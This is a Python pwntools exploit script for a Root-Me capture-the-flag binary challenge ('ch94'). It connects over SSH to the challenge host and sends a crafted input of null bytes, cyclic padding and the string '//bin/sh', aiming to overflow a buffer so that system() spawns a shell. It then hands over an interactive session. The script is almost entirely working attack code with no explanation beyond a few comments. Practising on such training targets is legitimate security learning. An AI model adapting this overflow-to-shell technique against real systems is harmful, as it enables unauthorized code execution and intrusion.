from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
context.arch = 'amd64'
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}
elf = ELF("./ch94")




s = ssh(host='challenge03.root-me.org',user='app-systeme-ch94',password='app-systeme-ch94',port=2223)
#p = remote("ip", 4444)
p = s.process('./ch94')
#p = gdb.debug(['./ch94'],ssh=s, gdbscript='''break *main
#b *main+9
#b *main+23
#b *main+106
#b *checkArg+193
#''')

binsh = b'//bin/sh'

payload = cyclic(47)
#rdi = b'B' * 8
null = b'\x00'

# The last null cleans input to 8 bytes for strcat() RDI
# 1st null ends variable string for system() RDI
exploit = null + payload + binsh + null

pause()
p.sendline(exploit)
p.interactive()
p.close()


